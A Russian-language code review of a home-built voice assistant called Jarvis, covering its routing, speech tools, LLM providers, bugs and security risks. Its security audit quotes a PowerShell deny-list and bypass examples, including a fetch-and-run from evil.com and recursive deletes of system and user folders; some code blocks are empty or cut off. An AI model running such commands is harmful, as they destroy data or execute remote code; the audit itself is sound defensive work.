### Поток данных: от ввода до ответа

#### Уровень 1 — Локальные команды (без LLM, мгновенно)

```
Сообщение пользователя
  → local_handler.py: проверка по regex-паттернам
  → Совпадение найдено? ("открой discord", "время", "создай файл", и т.д.)
  → Локальное выполнение (subprocess, os, winreg...)
  → Мгновенный ответ
  [API не вызывается, квота не тратится]
```

#### Уровень 2 — Поиск (бесплатный, быстрый)

```
Сообщение пользователя
  → router.py: классифицирует как SEARCH
  → web_search() через DuckDuckGo (бесплатно)
  → Сырые результаты → Groq (llama-3.3-70b, бесплатный тир) синтезирует ответ
  → Ответ Джарвису
  [Квота Gemini не тратится; при сбое Groq — возвращаются форматированные результаты]
```

#### Уровень 3 — Полноценный ИИ (платный LLM)

```
Сообщение пользователя
  → router.py: классифицирует как AI
  → memory.get_relevant_memories(query) — поиск по ChromaDB (до 5 результатов)
  → LLM (Gemini / Claude): системный промпт + память + история + сообщение
  → LLM хочет использовать инструменты?
      ДА → выполнить инструмент → результат обратно в LLM → итоговый ответ
      НЕТ → текст напрямую
  → Сохранение в историю + ChromaDB
```

#### Голосовой режим

```
Нажатие Enter (push-to-talk)
  → stt.record_auto(): запись до паузы в речи
  → stt.transcribe(): faster-whisper локально → текст
  → assistant.chat(текст): следует уровням 1/2/3 выше
  → tts.speak(ответ): edge-tts → MP3 → DSP → sounddevice
```

## 2. ТЕКУЩИЙ ФУНКЦИОНАЛ

### Голосовой ввод (STT)

- **Движок**: `faster-whisper` — локальный, без интернета, без API
- **Модель**: настраивается (`tiny` → `medium`), по умолчанию средний баланс скорость/качество
- **Язык**: русский (задан явно, можно расширить)
- **Определение тишины**: RMS-порог + минимальная пауза 300 мс
- **GPU**: автодетект CUDA, фолбэк на CPU
- **Initial prompt**: список подсказок Whisper захардкожен в `stt.py:23-29` (должно быть в конфиге)
- **Режим**: push-to-talk (нажать Enter для записи) — wake word не реализован несмотря на наличие файлов `wake_word.py` / `wake_audio.py`

### Голосовой вывод (TTS)

**Основной — edge-tts (Microsoft Neural, бесплатно):**
- Асинхронный конвейер: генерирует фразу N+1 пока играет N
- Разбивка на предложения (по `. ! ?`) с буферизацией от 70 символов
- Голос: мужской нейронный, скорость −8%, тон −10 Гц (тембр ниже и медленнее)

**Вторичный — ElevenLabs (платно, ~$5/мес):**
- Голос Daniel (`onwK4e9ZLuTAKqWW03F9`), модель `eleven_multilingual_v2`
- Стабильность: 0.5, схожесть: 0.75
- Лимит ~10к символов/мес бесплатно
- Автоматический фолбэк на edge-tts при ошибке API

**DSP-обработка (JARVIS-звучание):**
- Высокочастотный фильтр 90 Гц (убирает гул)
- Резонансный пик на 900 Гц (+15% микс)
- Буст присутствия 3–5.5 кГц (+18% микс)
- Мягкое насыщение (tanh)
- Ранние отражения/реверб (12% микс, затухание 40 мс)
- Требует `scipy.signal`; без него — простое воспроизведение через playsound

### Маршрутизация запросов

Три уровня в `core/router.py`:

| Уровень | Тип | Стоимость | Примеры |
|---------|-----|-----------|---------|
| 1 | LOCAL | Бесплатно | «открой discord», «время», «скриншот» |
| 2 | SEARCH | Бесплатно | «погода в Москве», «курс доллара», «новости» |
| 3 | AI | Платно | «напиши код», «составь план», «объясни» |

Важная деталь: AI-паттерны проверяются **первыми**, поэтому «найди и запомни» → AI, а не SEARCH — это сделано намеренно для правильной приоритизации.

## 3. КАКИЕ ИИ/API ИСПОЛЬЗУЮТСЯ

### Google Gemini (основной LLM)

- **Модель**: `models/gemini-2.0-flash` (основная), фолбэк `gemini-2.0-flash-lite`
- **Где используется**: все запросы уровня 3 (AI)
- **Ротация ключей**: несколько ключей в `.env`, автопереключение при 429
- **Логика ошибок**:
  - 429 per-minute → ждёт `retryDelay` из ответа API
  - 429 daily → переключает ключ
  - 503 → экспоненциальный бэкофф (15с, 30с, 45с)
- **Поддержка инструментов**: да, формат `function_call`
- **Стоимость**: бесплатный тир с лимитами; при ротации нескольких ключей — существенно больший лимит

### Anthropic Claude (резервный LLM)

- **Модель**: `claude-sonnet-4-6`
- **Где используется**: альтернатива Gemini (переключается в конфиге)
- **Ключ**: `ANTHROPIC_API_KEY` в `.env` — **сейчас пустой**
- **Поддержка инструментов**: да, формат `tool_use` с ID
- **Обработка ошибок**: минимальная (нет retry-логики)
- **Стоимость**: платный (нет бесплатного тира для API)

### Groq (быстрый вывод)

- **Модель**: `llama-3.3-70b-versatile`
- **Где используется**: только для синтеза результатов поиска (уровень 2)
- **Ключ**: `GROQ_API_KEY` — **валидный ключ присутствует**
- **Таймаут**: 15 секунд
- **Стоимость**: бесплатный тир доступен (при сбое — тихий фолбэк на форматированные результаты)

### Ollama (локальный)

- **Модель**: настраиваемая (по умолчанию `llama3.2`)
- **Где используется**: полная замена облачных LLM без интернета
- **Проверка**: пингует `/api/tags` при старте
- **Стоимость**: бесплатно, но нужен мощный PC

### ElevenLabs (голос)

- **Модель**: `eleven_multilingual_v2`
- **Где используется**: TTS (высокое качество голоса)
- **Голос**: Daniel (`onwK4e9ZLuTAKqWW03F9`)
- **Ключ**: `ELEVENLABS_API_KEY` — **валидный ключ присутствует**
- **Стоимость**: ~10к символов/мес бесплатно, далее платно (~$5/мес)

### edge-tts (голос, бесплатно)

- **Где используется**: основной TTS или фолбэк при отказе ElevenLabs
- **Стоимость**: полностью бесплатно, провайдер — Microsoft Neural Voices
- **Авторизация**: не нужна

### DuckDuckGo Search

- **Где используется**: поиск уровня 2 + инструмент `web_search`
- **Стоимость**: бесплатно
- **Библиотека**: `ddgs`
- **Лимиты**: не настроены; DuckDuckGo может временно блокировать при частых запросах

### faster-whisper (STT)

- **Где используется**: транскрипция речи в голосовом режиме
- **Работает**: полностью локально, без интернета
- **Стоимость**: бесплатно

## 4. ЧТО СЛОМАНО ИЛИ РАБОТАЕТ ПЛОХО

### Критические баги

#### БАГ #1: Игнорируются множественные вызовы инструментов (`assistant.py:120`)

```python
# LLM запросил 2 инструмента одновременно — оба выполнились,
# но в LLM возвращается только результат первого:
tool_result = "\n\n".join(combined_results) if len(combined_results) > 1 else combined_results[0]
tool_call = response.tool_calls[0]  # ← ТОЛЬКО ПЕРВЫЙ
response = self._llm.chat_with_tool_result(..., tool_call=tool_call, tool_result=tool_result)
```

**Последствие**: Если LLM одновременно запрашивает `web_search` + `add_note`, второй результат не попадёт в LLM для синтеза. Инструмент выполнился, но LLM об этом не знает.  
**Серьёзность**: ВЫСОКАЯ

#### БАГ #2: Захардкоженный путь Discord bypass (`scenarios.py:330`)

```python
fn=lambda: _launch(r"C:\fix_dc_1.9.8с\general (ALT11).bat"),
```

**Последствие**: Игровой режим упадёт на любой машине кроме разработчика. Путь не вынесен в конфиг.  
**Серьёзность**: ВЫСОКАЯ

#### БАГ #3: Нет обработки ошибок в Claude-провайдере (`claude.py:55`)

```python
response = self._client.messages.create(**kwargs)
# Нет try/except, нет retry, нет backoff
```

В Gemini — полноценная логика ротации и ретраев. В Claude — голый вызов. При любой сетевой ошибке — исключение до пользователя.  
**Серьёзность**: СРЕДНЯЯ

### Средние проблемы

#### БАГ #4: Кэш аудио-устройства не сбрасывается (`stt.py:31`)

```python
_cached_device: int | None = -1  # Глобальный, вечный кэш
```

Если отключить/переподключить микрофон — нужен перезапуск всего Jarvis.

#### БАГ #5: Тихий проглот ошибок ElevenLabs (`tts.py:351`)

```python
except Exception:

```

UX хороший — пользователь не видит ошибки. Но диагностика невозможна: непонятно, почему вдруг голос изменился.

#### БАГ #6: Незакрытый event loop TTS

Asyncio event loop для TTS создаётся но не завершается корректно при ошибках. Потенциальная утечка ресурсов при длительной работе.

```python

```

Русский текст из PowerShell может быть искажён заменой символов. `errors="replace"` скрывает это.

## 5. ПРОБЛЕМЫ БЕЗОПАСНОСТИ И РИСКИ

### Критические

#### SEC #1: API-ключи в plaintext `.env`

- **Что хранится**: GEMINI_API_KEYS (2 валидных), ELEVENLABS_API_KEY (валидный), GROQ_API_KEY (валидный)
- **Где**: `C:\Projects\Jarvis\.env` — читаемый любым локальным пользователем
- **Риск**: утечка в Git, кража локальным пользователем, индексация поисковиком при случайном публичном доступе
- **Решение**: Windows Credential Manager, переменные окружения системы, или хотя бы `python-dotenv` + `.gitignore` строго

#### SEC #2: PowerShell с недостаточной фильтрацией (`pc_control.py:113`)

```python
danger_patterns = [
    "format-volume", "format ", "rm -rf", "del /s /q c:\\",
    "remove-item -recurse -force c:\\windows",
]
```

**Обходы (примеры):**
```powershell
Remove-Item -Recurse -Force C:\Windows          # другой регистр/пробелы
Invoke-WebRequest http://evil.com/payload.ps1 | Invoke-Expression  # не в списке
Start-Process cmd -ArgumentList "/c del /f /s /q C:\Users"        # через cmd
```

Метод блэклиста принципиально ненадёжен. При компрометации или джейлбрейке LLM — возможно выполнение любой команды.  
**Решение**: только вайтлист разрешённых команд/командлетов.

#### SEC #3: Создание файлов по произвольным путям (`pc_control.py:22`)

```python

    return "Ошибка: ..."
```

**Обходы:**

- UNC-пути `\\server\share\`

### Средние риски

#### SEC #4: Чтение файлов без ограничения путей (`tools/files.py`)

Путь к файлу приходит от LLM, нет проверки на traversal. LLM потенциально может попросить прочитать любой системный файл.

#### SEC #5: Завершение процессов (игровой режим)

Вайтлист из 160+ записей защищает от случайностей, но он статичный и не обновляется. Удаление `explorer.exe` из вайтлиста уронило бы рабочий стол.

---

### Низкие риски

- **Нет rate-limiting на инструменты**: спам `web_search` или `create_file_with_content` ничем не ограничен на уровне Jarvis
- **Temp-файлы**: создаются через `tempfile.mkstemp()` в системном TEMP, доступ только владельцу (Windows по умолчанию — ок)

### Сильные стороны

### Слабые стороны

#### Монолит `core/local_handler.py` — 1600+ строк

Файл делает всё сразу: управление приложениями, файловые операции, системные команды, управление процессами, работа с реестром. Должен быть разбит минимум на 4 модуля:
- `handlers/apps.py` (~400 строк)
- `handlers/files.py` (~400 строк)
- `handlers/system.py` (~400 строк)
- `handlers/utils.py` (~200 строк)

#### Глобальное состояние, небезопасное для потоков

```python
# local_handler.py, ~строки 245-251
_pending_app = None
_pending_op = None
_pending_scenario = None

```

В GUI-режиме несколько потоков могут гонять по этим переменным одновременно. Нет блокировок (`threading.Lock`).

#### Магические числа разбросаны по коду

```python

# config.py
```

Всё это должно быть в `config.py` с именованными константами и комментариями.

## 7. ЧЕГО НЕТ, НО НАПРАШИВАЕТСЯ

### Wake Word (почти реализован, но нет)

Файлы `wake_word.py` и `wake_audio.py` существуют, но содержат заглушки. Настоящий wake word (тип «Эй, Джарвис») потребует одной из библиотек: Porcupine (Picovoice, ~$36/год), openWakeWord (бесплатно, хуже качеством), или sherpa-onnx (локально, бесплатно).

### Стриминг ответов

Сейчас LLM ждёт полного ответа, потом передаёт в TTS. Можно начинать говорить первое предложение пока LLM ещё генерирует остальное — задержка восприятия сократилась бы с ~3–5с до ~1–2с.

### Временно-ориентированная память

ChromaDB даёт семантический поиск, но нет хронологии. «Что ты говорил 3 сообщения назад?» не работает. Нужна гибридная: семантика + временные индексы.

### Экспорт и импорт разговоров

Нет возможности сохранить историю сессии в файл или продолжить с места остановки.

### Настройка личности в рантайме

Системный промпт захардкожен в `personality.py`. Нельзя переключиться в «серьёзный режим», «короткие ответы», «режим учителя» без правки кода.

### Интеграция с OS-уведомлениями

Нет возможности присылать тостовые уведомления Windows когда Jarvis что-то закончил в фоне (скачал файл, выполнил план).

### Планировщик задач

Нет «напомни мне в 15:00», «каждое утро в 9 делай X». Сценарии только ручные.

### RAG по пользовательским документам

ChromaDB подключена только для диалоговой памяти. Можно было бы индексировать папки документов и отвечать на вопросы по ним.

### Мультимодальность

Нет распознавания изображений (хотя Gemini Flash это поддерживает из коробки). «Что на этом скриншоте?» было бы просто добавить.

## РЕЗЮМЕ: 5 САМЫХ ВАЖНЫХ ВЕЩЕЙ

### 1. Безопасность PowerShell — **срочно**
`run_powershell` с блэклистом из 6 паттернов — дыра. При любом джейлбрейке LLM возможно выполнение деструктивных команд. Нужен вайтлист разрешённых действий, или хотя бы подтверждение пользователя перед выполнением.

### 2. Баг с множественными tool calls — **срочно**
Если LLM запрашивает два инструмента одновременно, второй результат теряется для LLM. Баг ломает сложные сценарии типа «найди информацию и запиши в заметку». Починка — переслать все результаты обратно в LLM.

### 3. Захардкоженный путь Discord bypass — **срочно**
`C:\fix_dc_1.9.8с\general (ALT11).bat` — игровой режим нерабочий без этого конкретного файла. Должно быть в конфиге и проверяться при старте.

### 4. API-ключи из `.env` → безопасное хранение — **важно**
ElevenLabs и Gemini ключи лежат в plaintext. Минимум — убедиться что `.env` не в Git. Лучше — Windows Credential Manager или системные переменные окружения.

### 5. Разбить `local_handler.py` + добавить логирование — **важно для поддержки**
1600-строчный монолит с глобальным состоянием — главное препятствие для любых улучшений. Параллельно стоит заменить `print()` на `logging` — без файла логов диагностика сбоев в продакшне невозможна.
